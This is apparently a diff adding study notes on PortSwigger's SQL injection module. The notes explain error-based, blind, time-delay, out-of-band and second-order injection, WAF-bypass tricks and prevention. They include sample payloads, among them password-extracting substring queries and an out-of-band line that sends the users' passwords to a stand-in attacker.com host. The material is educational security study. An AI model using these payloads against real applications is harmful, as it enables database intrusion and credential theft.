@@ -113,7 +113,88 @@ https://portswigger.net/web-security/sql-injection/cheat-sheet
     `xyz' AND (SELECT CASE WHEN (condition) THEN 1/0 ELSE 'a' END)='a`
 - **Verbose Error Messages:**  
     Occasionally, misconfigurations expose detailed SQL errors revealing query structure and aiding injection construction.
-    
+**Formal Notes: PortSwigger SQL Injection Module**  
+*Prepared for Namura on Tuesday, December 23, 2025*  
+
+---
+
+### **1. Error-Based SQL Injection**  
+- **Mechanism**: Exploits database error messages to extract data. Invalid queries force the database to return verbose errors containing sensitive information (e.g., table names, query structure).  
+- **Key Techniques**:  
+  - Inject malformed syntax (e.g., `'`, `"`, parentheses) to trigger errors.  
+  - Leverage database-specific functions (e.g., `EXTRACTVALUE()` in MySQL, `CAST()` in PostgreSQL) to force errors containing target data.  
+- **Critical Insight**: Requires verbose error reporting enabled on the target database. Mitigation involves suppressing detailed errors in production environments.  
+
+---
+
+### **2. Blind SQL Injection**  
+- **Definition**: Occurs when the application does not return database errors or query results directly. Responses are boolean (true/false) or time-based.  
+- **Subtypes**:  
+  - **Conditional Responses**: Application behavior changes based on injected boolean conditions (e.g., `1=1` vs. `1=2`).  
+  - **Time Delays**: Inject `SLEEP()` (MySQL), `PG_SLEEP()` (PostgreSQL), or `WAITFOR DELAY` (MSSQL) to infer truth via response latency.  
+  - **Out-of-Band (OAST)**: Exfiltrate data via external channels (e.g., DNS/HTTP requests) using functions like `LOAD_FILE()` (MySQL) or `UTL_HTTP` (Oracle).  
+
+---
+
+### **3. Exploiting Blind SQLi: Conditional Responses**  
+- **Methodology**:  
+  1. Identify injectable parameters by testing boolean conditions (e.g., `' AND 1=1--` vs. `' AND 1=2--`).  
+  2. Extract data character-by-character using substring functions (e.g., `SUBSTRING((SELECT password FROM users), 1, 1) = 'a'`).  
+- **Automation**: Tools like Burp Intruder or SQLmap automate iterative testing for efficiency.  
+
+---
+
+### **4. Exploiting Blind SQLi: Time Delays**  
+- **Use Case**: Effective when conditional responses are indistinguishable.  
+- **Syntax Examples**:  
+  - MySQL: `' UNION SELECT IF(1=1, SLEEP(5), 'a')--`  
+  - MSSQL: `'; IF (1=1) WAITFOR DELAY '0:0:5'--`  
+- **Limitation**: Network latency may obscure timing differences; requires multiple tests for reliability.  
+
+---
+
+### **5. Exploiting Blind SQLi: Out-of-Band (OAST)**  
+- **Workflow**:  
+  1. Trigger DNS/HTTP requests to an attacker-controlled server via database functions.  
+  2. Exfiltrate data by embedding it in the request (e.g., `LOAD_FILE('\\\\attacker.com\\' || (SELECT password FROM users))`).  
+- **Advantage**: Bypasses network restrictions and avoids noisy time-based payloads.  
+- **Tools**: Burp Collaborator or Interact.sh for monitoring external interactions.  
+
+---
+
+### **6. SQL Injection in Different Contexts**  
+- **Challenges**: Injection points vary by context (e.g., `WHERE` clauses, `ORDER BY`, stored procedures).  
+- **Adaptation Strategies**:  
+  - **String Contexts**: Escape quotes with `'` or `"`.  
+  - **Numeric Contexts**: Omit quotes; use arithmetic (e.g., `1+1`).  
+  - **Boolean Logic**: Bypass filters using `OR 1=1--` instead of `' OR '1'='1`.  
+  - **Alternative Syntax**: Bypass WAFs with inline comments (`SEL/**/ECT`), URL encoding, or multi-byte characters.  
+
+---
+
+### **7. Second-Order SQL Injection**  
+- **Mechanism**: Malicious input is stored benignly (e.g., in a user profile), then executed later when retrieved and concatenated into a dynamic query.  
+- **Example**:  
+  1. Attacker sets username to `' UNION SELECT password FROM users--`.  
+  2. Application saves input *without immediate exploitation*.  
+  3. Later, a password reset feature dynamically queries `username` without sanitization, triggering injection.  
+- **Defense**: Treat *all* data sources (including databases) as untrusted; use parameterized queries consistently.  
+
+---
+
+### **8. Prevention of SQL Injection**  
+- **Primary Mitigation**: **Parameterized Queries (Prepared Statements)**.  
+  - Separates data from commands using placeholders (e.g., `?` in Java, `@param` in .NET).  
+- **Secondary Defenses**:  
+  - **Input Validation**: Whitelist allowed characters (e.g., regex for emails).  
+  - **Least Privilege**: Restrict database user permissions.  
+  - **Error Handling**: Generic error messages; avoid leaking stack traces.  
+  - **Web Application Firewall (WAF)**: Deploy as a *supplemental* layer (not primary defense).  
+- **Critical Principle**: **Never** concatenate untrusted input into SQL queries. ORM frameworks (e.g., Hibernate, Entity Framework) *do not* inherently prevent injection if raw queries are used.  
+
+---  
+*End of Notes*  
+*Source: PortSwigger Web Security Academy SQL Injection Module*
 
 These notes cover the **core methods, techniques, and considerations** for both types of SQL injection attacks, useful for understanding vulnerabilities, exploitation strategies, and database-specific nuances.
 
